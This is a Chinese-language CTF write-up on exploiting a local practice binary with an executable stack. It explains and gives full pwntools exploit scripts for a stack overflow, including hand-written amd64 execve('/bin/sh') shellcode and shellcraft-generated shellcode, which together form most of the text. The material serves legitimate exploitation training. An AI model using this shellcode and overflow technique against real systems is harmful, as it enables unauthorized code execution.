# 【3】shellcode 的编写

> 这次尝试写 shellcode 与利用工具生成 shellcode

[题目链接](https://pan.baidu.com/s/1xfGWKGKwVqgGVzrc95zgjA?pwd=2333) 找 `blog3_blog3` 文件夹

## 题目信息

### checksec

![image-20221126145840867](E:\Pictures\markdown\image-20221126145840867.png)

栈上可写可执行（执行 **shellcode** 的最佳条件），没有 **canary**

### elf

![image-20221126150002506](E:\Pictures\markdown\image-20221126150002506.png)

题目执行后信息如图，选择一项直接输入 **payload**，

1. 直接使用 **pwnlib.shellcraft.sh()** 创建 **shellcode**

	![image-20221126150225849](E:\Pictures\markdown\image-20221126150225849.png)

2. 利用现有的条件手动编写 **shellcode**

	![image-20221126150259644](E:\Pictures\markdown\image-20221126150259644.png)

## 题解

### 1. shellcraft.sh()

题目很明显给了充足的位置来写 **shellcode**，直接调用 **pwntool** 即可

`shellcode = asm(shellcraft.amd64.sh(), arch='amd64')`

这里 **shellcode** 的长度为 48 byte，实测能成功执行完的条件为 `可以 read 的长度 > buf + 16（最少，不考虑其他变量和 canary，64 位） > shellcode 长度 + 26（考虑到 shellcode 中还会有栈的消长）`

### 2. 手动编写 shellcode

使用 **shellcraft.sh()** 对可写入区域有着比较严格的条件，这里给出一个利用 **rbp** 给 **execve()** 函数传参的手写 **shellcode**，

> 要执行 `execve("/bin/sh", [0], 0)`，至少需要完成几个条件：
>
> 1. rdi = ['/bin/sh']
> 2. rsi = [0]
> 3. rdx = 0
> 4. rax = 59 (0x3b)
> 5. syscall

编写的 **shellcode** 如下：

```python
shellcode = '''
xor rdx, rdx
push rdx
mov rsi, rsp
push rbp	/* 这里正好利用了 rbp 寄存器来传 /bin/sh 值*/
mov rdi, rsp
mov rax, 59
syscall
'''
str_bin_sh = 0x68732f2f6e69622f	# 这个就是 "/bin/sh" 字符串的 byte 值
shellcode = asm(shellcode, arch='amd64')
payload = shellcode + b'a' * (0x20 - len(shellcode)) + p64(str_bin_sh) + p64(bin_stack_top)
```

## EXP

### 1. shellcraft.sh()

```python
# -*- coding: utf-8 -*-

'''
[*] '/home/wkyuu/Desktop/temp/blog3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
'''

from pwn import *
import pwn

p64 = pwn.p64
u64 = pwn.u64

context(log_level='debug')
fileName = './blog3'
p = process(fileName)
elf = ELF(fileName)

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))
        
# rop
logger('rop')
p.sendlineafter(b'choose: \n', b'1')
p.recvuntil(b'your return address should be: ')
bin_stack_top = int(p.recv(14), 16)
shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
payload = shellcode + b'a' * (0x58 - len(shellcode)) + p64(bin_stack_top)
p.sendlineafter(b'\n', payload)

p.interactive()
```

### 2. 手动编写 shellcode

```python
# -*- coding: utf-8 -*-

'''
[*] '/home/wkyuu/Desktop/temp/blog3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
'''

from pwn import *
import pwn

p64 = pwn.p64
u64 = pwn.u64

context(log_level='debug')
fileName = './blog3'
p = process(fileName)
elf = ELF(fileName)


def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))


# rop
logger('rop')
p.sendlineafter(b'choose: \n', b'2')
p.recvuntil(b'return to stack: ')
bin_stack_top = int(p.recv(14), 16)

str_bin_sh = 0x68732f2f6e69622f
shellcode = '''
xor rdx, rdx
push rdx
mov rsi, rsp
push rbp
mov rdi, rsp
mov rax, 59
syscall
'''

shellcode = asm(shellcode, arch='amd64')
payload = shellcode + b'a' * \
    (0x20 - len(shellcode)) + p64(str_bin_sh) + p64(bin_stack_top)
p.sendlineafter(b'\n', payload)

p.interactive()
```

